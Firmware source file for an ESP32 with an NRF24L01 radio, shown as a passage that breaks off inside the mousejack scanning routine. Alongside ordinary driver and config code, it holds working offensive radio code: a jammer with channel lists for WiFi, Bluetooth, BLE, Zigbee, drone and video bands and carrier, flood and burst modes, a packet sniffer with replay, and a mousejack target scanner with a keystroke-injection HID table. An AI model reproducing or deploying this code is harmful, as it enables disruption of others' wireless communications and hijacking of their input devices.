// ============================================================
//  nrf24_module.cpp  -  NRF24L01 Real Hardware Implementation
//  Added: Jammer, Spectrum, Mousejack (ported from Bruce firmware)
// ============================================================
#include "nrf24_module.h"
#include "sd_manager.h"

#define NRF24_TAG "[NRF24]"

Nrf24Module nrf24Module;

// ── Jammer channel lists (from Bruce nrf_jammer.cpp) ─────────────────────────
static const uint8_t JAM_FLOOD_DATA[32] = {
    0x55,0xAA,0x55,0xAA,0x55,0xAA,0x55,0xAA,
    0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE,
    0xFF,0x00,0xFF,0x00,0xA5,0x5A,0xA5,0x5A,
    0x01,0x23,0x45,0x67,0x89,0xAB,0xCD,0xEF
};

static const uint8_t CH_WIFI[]      = {1,3,5,7,9,11,13,15,17,19,21,23,26,28,30,32,34,36,38,40,42,51,53,55,57,59,61,63,65,67,69,71,73};
static const uint8_t CH_BLE[]       = {2,4,6,8,10,12,14,16,18,20,22,24,26,28,30,32,34,36,38,40,42,44,46,48,50,52,54,56,58,60,62,64,66,68,70,72,74,76,78,80};
static const uint8_t CH_BLE_ADV[]   = {2,26,80};
static const uint8_t CH_BLUETOOTH[] = {2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80};
static const uint8_t CH_USB[]       = {32,34,36,38,40,42,44,46,48,50,52,54,56,58,60,62,64,66,68,70};
static const uint8_t CH_VIDEO[]     = {60,62,64,66,68,70,72,74,76,78,80,82,84,86,88,90,92,94,96,98,100,102,104,106,108,110,112,114,116,118,120,122,124};
static const uint8_t CH_RC[]        = {1,3,5,7,9,11,13,15,17,19,21,23,25,27,29,31,33,35,37,39};
static const uint8_t CH_ZIGBEE[]    = {4,5,6,9,10,11,14,15,16,19,20,21,24,25,26,29,30,31,34,35,36,39,40,41,44,45,46,49,50,51,54,55,56,59,60,61,64,65,66,69,70,71,74,75,76,79,80,81};

const uint8_t* Nrf24Module::_jamGetChannels(NrfJamMode mode, size_t& count) {
    switch (mode) {
        case NrfJamMode::WIFI:      count = sizeof(CH_WIFI);      return CH_WIFI;
        case NrfJamMode::BLE:       count = sizeof(CH_BLE);       return CH_BLE;
        case NrfJamMode::BLE_ADV:   count = sizeof(CH_BLE_ADV);   return CH_BLE_ADV;
        case NrfJamMode::BLUETOOTH: count = sizeof(CH_BLUETOOTH); return CH_BLUETOOTH;
        case NrfJamMode::USB:       count = sizeof(CH_USB);       return CH_USB;
        case NrfJamMode::VIDEO:     count = sizeof(CH_VIDEO);     return CH_VIDEO;
        case NrfJamMode::RC:        count = sizeof(CH_RC);        return CH_RC;
        case NrfJamMode::ZIGBEE:    count = sizeof(CH_ZIGBEE);    return CH_ZIGBEE;
        default: count = 0; return nullptr; // FULL + DRONE = random hop
    }
}

// ── ASCII to HID (Mousejack) ──────────────────────────────────────────────────
static const MjHidKey ASCII_TO_HID[] = {
    {MJ_MOD_NONE,   MJ_KEY_SPACE},    // 0x20 space
    {MJ_MOD_LSHIFT, MJ_KEY_1},        // !
    {MJ_MOD_LSHIFT, MJ_KEY_QUOTE},    // "
    {MJ_MOD_LSHIFT, MJ_KEY_3},        // #
    {MJ_MOD_LSHIFT, MJ_KEY_4},        // $
    {MJ_MOD_LSHIFT, MJ_KEY_5},        // %
    {MJ_MOD_LSHIFT, MJ_KEY_7},        // &
    {MJ_MOD_NONE,   MJ_KEY_QUOTE},    // '
    {MJ_MOD_LSHIFT, MJ_KEY_9},        // (
    {MJ_MOD_LSHIFT, MJ_KEY_0},        // )
    {MJ_MOD_LSHIFT, MJ_KEY_8},        // *
    {MJ_MOD_LSHIFT, MJ_KEY_EQUAL},    // +
    {MJ_MOD_NONE,   MJ_KEY_COMMA},    // ,
    {MJ_MOD_NONE,   MJ_KEY_MINUS},    // -
    {MJ_MOD_NONE,   MJ_KEY_DOT},      // .
    {MJ_MOD_NONE,   MJ_KEY_SLASH},    // /
    {MJ_MOD_NONE,   MJ_KEY_0},        // 0
    {MJ_MOD_NONE,   MJ_KEY_1},        // 1
    {MJ_MOD_NONE,   MJ_KEY_2},        // 2
    {MJ_MOD_NONE,   MJ_KEY_3},        // 3
    {MJ_MOD_NONE,   MJ_KEY_4},        // 4
    {MJ_MOD_NONE,   MJ_KEY_5},        // 5
    {MJ_MOD_NONE,   MJ_KEY_6},        // 6
    {MJ_MOD_NONE,   MJ_KEY_7},        // 7
    {MJ_MOD_NONE,   MJ_KEY_8},        // 8
    {MJ_MOD_NONE,   MJ_KEY_9},        // 9
    {MJ_MOD_LSHIFT, MJ_KEY_SEMICOLON},// :
    {MJ_MOD_NONE,   MJ_KEY_SEMICOLON},// ;
    {MJ_MOD_LSHIFT, MJ_KEY_COMMA},    // <
    {MJ_MOD_NONE,   MJ_KEY_EQUAL},    // =
    {MJ_MOD_LSHIFT, MJ_KEY_DOT},      // >
    {MJ_MOD_LSHIFT, MJ_KEY_SLASH},    // ?
    {MJ_MOD_LSHIFT, MJ_KEY_2},        // @
    // A-Z
    {MJ_MOD_LSHIFT, MJ_KEY_A+ 0},{MJ_MOD_LSHIFT, MJ_KEY_A+ 1},{MJ_MOD_LSHIFT, MJ_KEY_A+ 2},
    {MJ_MOD_LSHIFT, MJ_KEY_A+ 3},{MJ_MOD_LSHIFT, MJ_KEY_A+ 4},{MJ_MOD_LSHIFT, MJ_KEY_A+ 5},
    {MJ_MOD_LSHIFT, MJ_KEY_A+ 6},{MJ_MOD_LSHIFT, MJ_KEY_A+ 7},{MJ_MOD_LSHIFT, MJ_KEY_A+ 8},
    {MJ_MOD_LSHIFT, MJ_KEY_A+ 9},{MJ_MOD_LSHIFT, MJ_KEY_A+10},{MJ_MOD_LSHIFT, MJ_KEY_A+11},
    {MJ_MOD_LSHIFT, MJ_KEY_A+12},{MJ_MOD_LSHIFT, MJ_KEY_A+13},{MJ_MOD_LSHIFT, MJ_KEY_A+14},
    {MJ_MOD_LSHIFT, MJ_KEY_A+15},{MJ_MOD_LSHIFT, MJ_KEY_A+16},{MJ_MOD_LSHIFT, MJ_KEY_A+17},
    {MJ_MOD_LSHIFT, MJ_KEY_A+18},{MJ_MOD_LSHIFT, MJ_KEY_A+19},{MJ_MOD_LSHIFT, MJ_KEY_A+20},
    {MJ_MOD_LSHIFT, MJ_KEY_A+21},{MJ_MOD_LSHIFT, MJ_KEY_A+22},{MJ_MOD_LSHIFT, MJ_KEY_A+23},
    {MJ_MOD_LSHIFT, MJ_KEY_A+24},{MJ_MOD_LSHIFT, MJ_KEY_A+25},
    {MJ_MOD_NONE,   MJ_KEY_LBRACKET}, // [
    {MJ_MOD_NONE,   MJ_KEY_BACKSLASH},// backslash
    {MJ_MOD_NONE,   MJ_KEY_RBRACKET}, // ]
    {MJ_MOD_LSHIFT, MJ_KEY_6},        // ^
    {MJ_MOD_LSHIFT, MJ_KEY_MINUS},    // _
    {MJ_MOD_NONE,   MJ_KEY_GRAVE},    // `
    // a-z
    {MJ_MOD_NONE,   MJ_KEY_A+ 0},{MJ_MOD_NONE,   MJ_KEY_A+ 1},{MJ_MOD_NONE,   MJ_KEY_A+ 2},
    {MJ_MOD_NONE,   MJ_KEY_A+ 3},{MJ_MOD_NONE,   MJ_KEY_A+ 4},{MJ_MOD_NONE,   MJ_KEY_A+ 5},
    {MJ_MOD_NONE,   MJ_KEY_A+ 6},{MJ_MOD_NONE,   MJ_KEY_A+ 7},{MJ_MOD_NONE,   MJ_KEY_A+ 8},
    {MJ_MOD_NONE,   MJ_KEY_A+ 9},{MJ_MOD_NONE,   MJ_KEY_A+10},{MJ_MOD_NONE,   MJ_KEY_A+11},
    {MJ_MOD_NONE,   MJ_KEY_A+12},{MJ_MOD_NONE,   MJ_KEY_A+13},{MJ_MOD_NONE,   MJ_KEY_A+14},
    {MJ_MOD_NONE,   MJ_KEY_A+15},{MJ_MOD_NONE,   MJ_KEY_A+16},{MJ_MOD_NONE,   MJ_KEY_A+17},
    {MJ_MOD_NONE,   MJ_KEY_A+18},{MJ_MOD_NONE,   MJ_KEY_A+19},{MJ_MOD_NONE,   MJ_KEY_A+20},
    {MJ_MOD_NONE,   MJ_KEY_A+21},{MJ_MOD_NONE,   MJ_KEY_A+22},{MJ_MOD_NONE,   MJ_KEY_A+23},
    {MJ_MOD_NONE,   MJ_KEY_A+24},{MJ_MOD_NONE,   MJ_KEY_A+25},
};

MjHidKey Nrf24Module::_asciiToHid(char c) {
    if (c >= 0x20 && c <= 0x7A) return ASCII_TO_HID[c - 0x20];
    return {MJ_MOD_NONE, 0};
}

// ─────────────────────────────────────────────────────────────
void Nrf24Module::setEnabled(bool en) {
    Nrf24GpioConfig cfg = loadGpioConfig();
    cfg.enabled = en; saveGpioConfig(cfg);
    _moduleEnabled = en;
    if (!en) {
        // Power down radio before releasing SPI
        if (_radio && _hwConnected) {
            _radio->stopListening();
            _radio->powerDown();
        }
        // Release SPI bus and delete objects
        if (_radio) { delete _radio; _radio = nullptr; }
        if (_spi)   { _spi->end(); delete _spi; _spi = nullptr; }
        _hwConnected = false;
        Serial.println("[NRF24] Disabled - SPI released, radio powered down");
    } else {
        // begin() already handles null check and fresh init
        begin();
    }
}

void Nrf24Module::begin() {
    _cfg = loadGpioConfig();
    _moduleEnabled = _cfg.enabled;
    memset(_scanChannels, 0, sizeof(_scanChannels));

    // Free any previous allocations
    if (_radio) { delete _radio; _radio = nullptr; }
    if (_spi)   { _spi->end(); delete _spi; _spi = nullptr; }
    _hwConnected = false;

    // Lazy init: allocate SPI + RF24 only if hardware is detected.
    // Without this, ~15KB RAM is consumed at boot even when NRF24 is absent.
    // Quick detect: bring up SPI, try RF24::begin, free everything if it fails.
    pinMode(_cfg.ce,  OUTPUT); digitalWrite(_cfg.ce,  LOW);
    pinMode(_cfg.csn, OUTPUT); digitalWrite(_cfg.csn, HIGH);

    SPIClass* spiProbe = (_cfg.spiBus == 1)
        ? new SPIClass(HSPI)
        : new SPIClass(VSPI);
    spiProbe->begin(_cfg.sck, _cfg.miso, _cfg.mosi, _cfg.csn);
    spiProbe->setFrequency(10000000);

    RF24* radioProbe = new RF24(_cfg.ce, _cfg.csn);
    bool beginOk = radioProbe->begin(spiProbe);

    Serial.printf(NRF24_TAG " RF24::begin=%s CE=%u CSN=%u SCK=%u MOSI=%u MISO=%u bus=%s\n",
                  beginOk?"OK":"FAIL", _cfg.ce, _cfg.csn,
                  _cfg.sck, _cfg.mosi, _cfg.miso,
                  _cfg.spiBus==1?"HSPI":"VSPI");

    if (beginOk && radioProbe->isChipConnected()) {
        // Hardware found — keep allocations
        _spi   = spiProbe;
        _radio = radioProbe;
        _hwConnected = true;
        _applyConfig();
        Serial.printf(NRF24_TAG " Connected - CE=%u CSN=%u ch=%u\n",
                      _cfg.ce, _cfg.csn, _channel);
    } else {
        // No hardware — free immediately to reclaim RAM
        delete radioProbe;
        spiProbe->end();
        delete spiProbe;
        _hwConnected = false;
        if (!beginOk)
            Serial.println(NRF24_TAG " RF24::begin failed - check CE/CSN/SPI wiring");
        Serial.println(NRF24_TAG " Not detected - verify: CE/CSN not swapped, 3.3V power, 100uF cap on VCC");
    }
}

// ─────────────────────────────────────────────────────────────
void Nrf24Module::reinit(const Nrf24GpioConfig& cfg) {
    saveGpioConfig(cfg);
    _cfg = cfg;
    if (_radio) { _radio->powerDown(); delete _radio; _radio = nullptr; }
    if (_spi)   { _spi->end();         delete _spi;   _spi   = nullptr; }
    begin();
}

// ─────────────────────────────────────────────────────────────
void Nrf24Module::_applyConfig() {
    if (!_radio || !_hwConnected) return;
    _radio->setPALevel(_toRF24Pa(_paLevel));
    _radio->setDataRate(_toRF24Rate(_dataRate));
    _radio->setChannel(_channel);
    _radio->setAutoAck(false);
    _radio->setPayloadSize(32);
}

// ─────────────────────────────────────────────────────────────
void Nrf24Module::loop() {
    if (!_hwConnected || !_radio) return;

    // ── Channel scanner ──────────────────────────────────────
    // C-03 FIX: scan 10 channels per loop() tick instead of all 125.
    // Old code: 125 channels × delayMicroseconds(128) = 16 ms blocked per call.
    // hw_poll runs on a 20 ms vTaskDelayUntil() tick, so the old scan
    // consumed 80% of hw_poll's budget, starving NFC/RFID/SubGHz.
    // New code: 10 channels × 128 us = 1.28 ms per tick - ~12x improvement.
    // A full 125-channel sweep completes in 13 loop() ticks (~260 ms) instead
    // of being one atomic 16 ms block. Results are equally accurate.
#define NRF24_SCAN_CHUNK 10
    if (_scanning && (millis() - _scanTimer) > 5) {
        _scanTimer = millis();
        uint8_t start = _scanChunkPos;
        uint8_t end   = (uint8_t)min((int)start + NRF24_SCAN_CHUNK, (int)NRF24_CHANNELS);
        bool vspiScan = (_cfg.spiBus != 1);
        if (vspiScan) xSemaphoreTakeRecursive(g_spi_vspi_mutex, pdMS_TO_TICKS(100));
        _radio->stopListening();
        for (uint8_t ch = start; ch < end; ch++) {
            _radio->setChannel(ch);
            _radio->startListening();
            delayMicroseconds(128);
            _radio->stopListening();
            if (_radio->testCarrier()) {
                if (_scanChannels[ch] < 255) _scanChannels[ch]++;
            } else {
                if (_scanChannels[ch] > 0) _scanChannels[ch]--;
            }
        }
        _scanChunkPos = (end >= NRF24_CHANNELS) ? 0 : end;
        // Restore channel and listening mode after each chunk
        _radio->setChannel(_channel);
        _radio->startListening();
        if (vspiScan) xSemaphoreGiveRecursive(g_spi_vspi_mutex);
    }

    // ── Sniffer ──────────────────────────────────────────────
    // Auto-stop sniffer after 5 min to prevent _sniffPending unbounded growth
    if (_sniffing && (millis() - _sniffTimer) > 300000UL) {
        stopSniff();
        Serial.println(NRF24_TAG " Sniffer auto-stopped after 5 min timeout");
    }
    if (_sniffing) {
        bool vspiSniff = (_cfg.spiBus != 1);
        if (vspiSniff) xSemaphoreTakeRecursive(g_spi_vspi_mutex, pdMS_TO_TICKS(100));
        bool avail = _radio->available();
        if (vspiSniff) xSemaphoreGiveRecursive(g_spi_vspi_mutex);
        if (avail) {
            if (vspiSniff) xSemaphoreTakeRecursive(g_spi_vspi_mutex, pdMS_TO_TICKS(100));
            uint8_t buf[32] = {};
            _radio->read(buf, 32);
            if (vspiSniff) xSemaphoreGiveRecursive(g_spi_vspi_mutex);
            char hex[65];
            for (int i = 0; i < 32; i++)
                snprintf(hex + i*2, 3, "%02X", buf[i]);
            hex[64] = '\0';

            Nrf24Packet pkt;
            pkt.channel   = _channel;
            pkt.timestamp = millis();
            pkt.data      = String(hex);

            char jsonbuf[100];
            snprintf(jsonbuf, sizeof(jsonbuf),
                     "{\"ch\":%u,\"data\":\"%s\"}", _channel, hex);
            if (_sniffPending.length() < 32768)
                _sniffPending += String(jsonbuf) + "\n";

            if (_capReplay && _replayBuf.size() < 256)
                _replayBuf.push_back(pkt);

            // Feature 34: NRF24 packet log to SD
            if (sdMgr.isAvailable()) {
                char logbuf[80];
                // addr is not directly available at this level; use hex prefix as identifier
                snprintf(logbuf, sizeof(logbuf),
                         "[NRF24] PKT ch=%u len=32 data=%.8s...", _channel, hex);
                sdMgr.log(logbuf, SdLogLevel::INFO, "NRF24");
            }
        }
    }

    // ── Bruce features tick ───────────────────────────────────
    _jamTick();
    _spectrumTick();
    _mjScanTick();
}

// ─────────────────────────────────────────────────────────────
void Nrf24Module::setChannel(uint8_t ch) {
    _channel = ch;
    if (_radio && _hwConnected) {
        _radio->setChannel(ch);
        Serial.printf(NRF24_TAG " Channel set to %u\n", ch);
    }
}

void Nrf24Module::setDataRate(Nrf24DataRate r) {
    _dataRate = r;
    if (_radio && _hwConnected)
        _radio->setDataRate(_toRF24Rate(r));
}

// ─────────────────────────────────────────────────────────────
void Nrf24Module::startScan() {
    if (!_hwConnected) return;
    memset(_scanChannels, 0, sizeof(_scanChannels));
    _scanning  = true;
    _scanTimer = millis();
    _radio->stopListening();
    Serial.println(NRF24_TAG " Channel scan started");
}

void Nrf24Module::stopScan() {
    _scanning = false;
    if (_radio && _hwConnected) {
        _radio->setChannel(_channel);
        _radio->startListening();
    }
    Serial.println(NRF24_TAG " Channel scan stopped");
}

// ─────────────────────────────────────────────────────────────
void Nrf24Module::startSniff() {
    if (!_hwConnected) return;
    _sniffPending = "";
    _sniffing    = true;
    _sniffTimer  = millis();
    _radio->setChannel(_channel);
    _radio->startListening();
    Serial.println(NRF24_TAG " Sniffer started");
}

void Nrf24Module::stopSniff() {
    _sniffing = false;
    if (_radio && _hwConnected) _radio->stopListening();
    Serial.println(NRF24_TAG " Sniffer stopped");
}

String Nrf24Module::pollSniffPacket() {
    String r = _sniffPending;
    _sniffPending = "";
    return r;
}

// ─────────────────────────────────────────────────────────────
void Nrf24Module::startReplayCapture() {
    _capReplay = true;
    _replayBuf.clear();
    Serial.println(NRF24_TAG " Replay capture started");
}

void Nrf24Module::stopReplayCapture() {
    _capReplay = false;
    Serial.printf(NRF24_TAG " Replay stopped, %u packets\n",
                  (unsigned)_replayBuf.size());
}

bool Nrf24Module::replayPackets() {
    if (!_hwConnected || _replayBuf.empty()) return false;
    bool vspi = (_cfg.spiBus != 1);
    if (vspi) xSemaphoreTakeRecursive(g_spi_vspi_mutex, pdMS_TO_TICKS(100));
    const uint8_t addr[6] = "1Node";
    _radio->openWritingPipe(addr);
    _radio->stopListening();
    for (const auto& pkt : _replayBuf) {
        _radio->setChannel(pkt.channel);
        uint8_t buf[32] = {};
        // Parse hex data back to bytes
        for (int i = 0; i < 32 && (i*2+1) < (int)pkt.data.length(); i++) {
            char h[3] = {pkt.data[i*2], pkt.data[i*2+1], '\0'};
            buf[i] = (uint8_t)strtol(h, nullptr, 16);
        }
        _radio->write(buf, 32);
        if (vspi) xSemaphoreGiveRecursive(g_spi_vspi_mutex);
        vTaskDelay(pdMS_TO_TICKS(2));  // FIX: yield to RTOS; delay() in hw_poll blocks siblings
        if (vspi) xSemaphoreTakeRecursive(g_spi_vspi_mutex, pdMS_TO_TICKS(100));
    }
    _radio->setChannel(_channel);
    _radio->startListening();
    if (vspi) xSemaphoreGiveRecursive(g_spi_vspi_mutex);
    Serial.printf(NRF24_TAG " Replayed %u packets\n",
                  (unsigned)_replayBuf.size());
    return true;
}

// ─────────────────────────────────────────────────────────────
void Nrf24Module::sendRcCommand(char dir, uint8_t speed) {
    if (!_hwConnected || !_radio) return;
    bool vspi = (_cfg.spiBus != 1);
    if (vspi) xSemaphoreTakeRecursive(g_spi_vspi_mutex, pdMS_TO_TICKS(100));
    const uint8_t addr[6] = "RCCAR";
    _radio->openWritingPipe(addr);
    _radio->stopListening();
    uint8_t payload[4] = {(uint8_t)dir, speed, 0, 0};
    _radio->write(payload, 4);
    _radio->startListening();
    if (vspi) xSemaphoreGiveRecursive(g_spi_vspi_mutex);
    Serial.printf(NRF24_TAG " RC dir=%c speed=%u\n", dir, speed);
}

// ─────────────────────────────────────────────────────────────
String Nrf24Module::statusJson() const {
    const char* rateStr =
        (_dataRate == Nrf24DataRate::RATE_250K) ? "250K" :
        (_dataRate == Nrf24DataRate::RATE_2M)   ? "2M"   : "1M";
    const char* paStr =
        (_paLevel == Nrf24PaLevel::PA_MIN)  ? "MIN"  :
        (_paLevel == Nrf24PaLevel::PA_LOW)  ? "LOW"  :
        (_paLevel == Nrf24PaLevel::PA_MAX)  ? "MAX"  : "HIGH";
    char buf[180];
    snprintf(buf, sizeof(buf),
             "{\"connected\":%s,\"channel\":%u,\"dataRate\":\"%s\","
             "\"paLevel\":\"%s\",\"scanning\":%s,\"sniffing\":%s,"
             "\"replayPkts\":%u}",
             _hwConnected?"true":"false", _channel, rateStr, paStr,
             _scanning?"true":"false", _sniffing?"true":"false",
             (unsigned)_replayBuf.size());
    return String(buf);
}

// ─────────────────────────────────────────────────────────────
void Nrf24Module::saveGpioConfig(const Nrf24GpioConfig& cfg) {
    File f = LittleFS.open(NRF24_GPIO_FILE, "w");
    if (!f) return;
    JsonDocument doc;
    doc["enabled"]    = cfg.enabled;
    doc["moduleType"] = (int)cfg.moduleType;
    doc["ce"]   = cfg.ce;   doc["csn"]  = cfg.csn;
    doc["sck"]  = cfg.sck;  doc["mosi"] = cfg.mosi;
    doc["miso"] = cfg.miso; doc["irq"]  = cfg.irq;
    doc["spiBus"]  = cfg.spiBus;
    doc["dataRate"]= (int)cfg.dataRate;
    doc["paLevel"] = (int)cfg.paLevel;
    serializeJson(doc, f);
    f.close();
}

Nrf24GpioConfig Nrf24Module::loadGpioConfig() const {
    Nrf24GpioConfig cfg;
    if (!LittleFS.exists(NRF24_GPIO_FILE)) return cfg;
    File f = LittleFS.open(NRF24_GPIO_FILE, "r");
    if (!f) return cfg;
    JsonDocument doc;
    if (deserializeJson(doc, f) == DeserializationError::Ok) {
        cfg.enabled    = doc["enabled"]    | false;
        cfg.moduleType = (Nrf24Module_t)(doc["moduleType"] | 0);
        cfg.ce   = doc["ce"]   | (uint8_t)16;
        cfg.csn  = doc["csn"]  | (uint8_t)17;
        cfg.sck  = doc["sck"]  | (uint8_t)18;
        cfg.mosi = doc["mosi"] | (uint8_t)23;
        cfg.miso = doc["miso"] | (uint8_t)19;
        cfg.irq  = doc["irq"]  | (uint8_t)0;
        cfg.spiBus   = doc["spiBus"]   | (uint8_t)0;
        cfg.dataRate = (Nrf24DataRate)(doc["dataRate"] | 1);
        cfg.paLevel  = (Nrf24PaLevel)(doc["paLevel"]   | 2);
    }
    f.close();
    return cfg;
}

// ─────────────────────────────────────────────────────────────
rf24_datarate_e Nrf24Module::_toRF24Rate(Nrf24DataRate r) const {
    switch (r) {
        case Nrf24DataRate::RATE_250K: return RF24_250KBPS;
        case Nrf24DataRate::RATE_2M:   return RF24_2MBPS;
        default:                        return RF24_1MBPS;
    }
}

rf24_pa_dbm_e Nrf24Module::_toRF24Pa(Nrf24PaLevel p) const {
    switch (p) {
        case Nrf24PaLevel::PA_MIN:  return RF24_PA_MIN;
        case Nrf24PaLevel::PA_LOW:  return RF24_PA_LOW;
        case Nrf24PaLevel::PA_MAX:  return RF24_PA_MAX;
        default:                     return RF24_PA_HIGH;
    }
}

// ── SD integration (features 34-35) ─────────────────────────

// Feature 35: backup NRF24 GPIO config to SD
bool Nrf24Module::backupConfigToSD(const String& tag) {
    if (!sdMgr.isAvailable()) return false;
    File src = LittleFS.open(NRF24_GPIO_FILE, "r");
    if (!src) return false;
    sdMgr.makeDir("/backups/" + tag);
    File dst = sdMgr.openForWrite("/backups/" + tag + "/nrf24_gpio.json");
    if (!dst) { src.close(); return false; }
    uint8_t buf[256];
    while (src.available()) {
        size_t n = src.read(buf, sizeof(buf));
        dst.write(buf, n);
    }
    src.close();
    dst.close();
    sdMgr.log("[NRF24] Config backed up tag=" + tag, SdLogLevel::INFO, "NRF24");
    return true;
}

// ═════════════════════════════════════════════════════════════
//  JAMMER  (ported from Bruce nrf_jammer.cpp)
// ═════════════════════════════════════════════════════════════

void Nrf24Module::_jamApplyConfig() {
    if (!_radio || !_hwConnected) return;
    rf24_pa_dbm_e  paLevels[]   = {RF24_PA_MIN, RF24_PA_LOW, RF24_PA_HIGH, RF24_PA_MAX};
    rf24_datarate_e dataRates[] = {RF24_1MBPS,  RF24_2MBPS,  RF24_250KBPS};
    _radio->setPALevel(paLevels[_jamCfg.paLevel   & 3]);
    _radio->setDataRate(dataRates[_jamCfg.dataRate & 2]);
    _radio->setAutoAck(false);
    _radio->setRetries(0, 0);
    _radio->setPayloadSize(32);
    const uint8_t addr[6] = "BJAMM";
    _radio->openWritingPipe(addr);
    _radio->stopListening();
}

void Nrf24Module::startJammer(NrfJamMode mode) {
    if (!_hwConnected || !_radio) {
        Serial.println(NRF24_TAG " Jammer: no hardware");
        return;
    }
    // Stop any other active modes
    if (_scanning)   stopScan();
    if (_sniffing)   stopSniff();
    if (_spectrum)   stopSpectrum();
    if (_mjScanning) stopMousejackScan();

    _jamMode    = mode;
    _jamCfg     = NrfJamConfig{};
    _jamChIdx   = 0;
    _jamSweeps  = 0;
    _jamDwellMs = 0;
    _jamStartMs = millis();
    _jamming    = true;
    _jamApplyConfig();
    Serial.printf(NRF24_TAG " Jammer started mode=%d\n", (int)mode);
}

void Nrf24Module::stopJammer() {
    if (!_jamming) return;
    _jamming = false;
    if (_radio && _hwConnected) {
        _radio->stopListening();
        _radio->setAutoAck(true);
        _radio->setPALevel(RF24_PA_HIGH);
        _radio->setDataRate(RF24_1MBPS);
    }
    Serial.printf(NRF24_TAG " Jammer stopped sweeps=%lu\n", _jamSweeps);
}

void Nrf24Module::_jamTick() {
    if (!_jamming || !_radio || !_hwConnected) return;

    size_t   chCount = 0;
    const uint8_t* chList = _jamGetChannels(_jamMode, chCount);

    uint8_t ch;
    if (chList && chCount > 0) {
        if (_jamCfg.randomHop)
            ch = chList[random(chCount)];
        else {
            ch = chList[_jamChIdx % chCount];
            _jamChIdx++;
            if (_jamChIdx >= chCount) { _jamChIdx = 0; _jamSweeps++; }
        }
    } else {
        // FULL / DRONE: random across all 125 channels
        ch = random(NRF24_CHANNELS);
        _jamChIdx++;
        if (_jamChIdx >= NRF24_CHANNELS) { _jamChIdx = 0; _jamSweeps++; }
    }

    _radio->setChannel(ch);

    switch (_jamCfg.strategy) {
        case 0: // CW — constant carrier
            _radio->startConstCarrier(RF24_PA_MAX, ch);
            delayMicroseconds(200);
            _radio->stopConstCarrier();
            break;
        case 1: // FLOOD
            _radio->writeFast(JAM_FLOOD_DATA, 32, true);
            break;
        default: // TURBO — burst of packets
            for (uint8_t b = 0; b < _jamCfg.burstSize; b++)
                _radio->writeFast(JAM_FLOOD_DATA, 32, true);
            _radio->txStandBy();
            break;
    }
}

String Nrf24Module::jammerStatusJson() const {
    static const char* modeNames[] = {
        "Full","WiFi","BLE","BLE_ADV","Bluetooth","USB","Video","RC","Zigbee","Drone"
    };
    char buf[128];
    snprintf(buf, sizeof(buf),
        "{\"jamming\":%s,\"mode\":\"%s\",\"sweeps\":%lu,\"elapsedMs\":%lu}",
        _jamming ? "true" : "false",
        modeNames[(int)_jamMode % NRF_JAM_MODE_COUNT],
        _jamSweeps,
        _jamming ? (unsigned long)(millis() - _jamStartMs) : 0UL);
    return String(buf);
}

// ═════════════════════════════════════════════════════════════
//  SPECTRUM  (ported from Bruce nrf_spectrum.cpp)
// ═════════════════════════════════════════════════════════════

void Nrf24Module::startSpectrum() {
    if (!_hwConnected || !_radio) return;
    if (_jamming)    stopJammer();
    if (_mjScanning) stopMousejackScan();
    memset(_specChans, 0, sizeof(_specChans));
    _specChIdx = 0;
    _spectrum  = true;
    _radio->setDataRate(RF24_1MBPS);
    _radio->setAutoAck(false);
    Serial.println(NRF24_TAG " Spectrum started");
}

void Nrf24Module::stopSpectrum() {
    _spectrum = false;
    if (_radio && _hwConnected) {
        _radio->stopListening();
        _applyConfig();
    }
    Serial.println(NRF24_TAG " Spectrum stopped");
}

void Nrf24Module::_spectrumTick() {
    if (!_spectrum || !_radio || !_hwConnected) return;
    // Scan 10 channels per tick (same chunked approach as existing scanner)
    uint8_t end = (uint8_t)min((int)_specChIdx + 10, 80);
    for (uint8_t i = _specChIdx; i < end; i++) {
        _radio->setChannel(i);
        _radio->startListening();
        delayMicroseconds(128);
        _radio->stopListening();
        int rpd = _radio->testRPD() ? 1 : 0;
        _specChans[i] = (uint8_t)((_specChans[i] * 3 + rpd * 125) / 4);
    }
    _specChIdx = (end >= 80) ? 0 : end;
    if (end >= 80) _radio->setChannel(_channel);
}

String Nrf24Module::spectrumJson() const {
    String r = "[";
    for (int i = 0; i < 80; i++) {
        if (i) r += ',';
        r += String(_specChans[i]);
    }
    r += ']';
    return r;
}

// ═════════════════════════════════════════════════════════════
//  MOUSEJACK  (ported from Bruce nrf_mousejack.cpp)
// ═════════════════════════════════════════════════════════════

void Nrf24Module::startMousejackScan() {
    if (!_hwConnected || !_radio) return;
    if (_jamming)  stopJammer();
    if (_spectrum) stopSpectrum();
    _mjTargetCount = 0;
    memset(_mjTargets, 0, sizeof(_mjTargets));
    _mjScanCh  = 0;
    _mjScanning = true;
    // Promiscuous-mode setup: 2Mbps, no ACK, 2-byte addr
    _radio->setDataRate(RF24_2MBPS);
    _radio->setAutoAck(false);
    _radio->setPayloadSize(32);
    _radio->setAddressWidth(2);
    const uint8_t promAddr[2] = {0x55, 0x42};
    _radio->openReadingPipe(0, promAddr);
    _radio->startListening();
    Serial.println(NRF24_TAG " Mousejack scan started");
}

void Nrf24Module::stopMousejackScan() {
    _mjScanning = false;
    if (_radio && _hwConnected) {
        _radio->stopListening();
        _radio->setAddressWidth(5);
        _applyConfig();
    }
    Serial.printf(NRF24_TAG " Mousejack scan stopped, targets=%u\n", _mjTargetCount);
}

void Nrf24Module::_mjScanTick() {
    if (!_mjScanning || !_radio || !_hwConnected) return;
    // Hop channel every 2ms
    if (millis() - _mjTimer < 2) return;
    _mjTimer = millis();

    if (_radio->available()) {
        uint8_t buf[32] = {};
        _radio->read(buf, 32);
        // Logitech unifying: buf[0] addr byte, buf[1] dev type
        // Check if addr already recorded
        bool found = false;
        for (uint8_t i = 0; i < _mjTargetCount; i++) {
            if (_mjTargets[i].addr[0] == buf[0] && _mjTargets[i].channel == _mjScanCh) {
                _mjTargets[i].lastSeen = millis();
                found = true; break;
            }
        }
        if (!found && _mjTargetCount < MJ_MAX_TARGETS) {
            MjTarget& t = _mjTargets[_mjTargetCount++];
            t.addr[0]  = buf[0];
            t.addr[1]  = buf[1];
            t.addrLen  = 2;
            t.channel  = _mjScanCh;
            t.devType  = (buf[1] & 0x40) ? 2 : 1; // keyboard vs mouse heuristic
            t.lastSeen = millis();
            t.valid    = true;
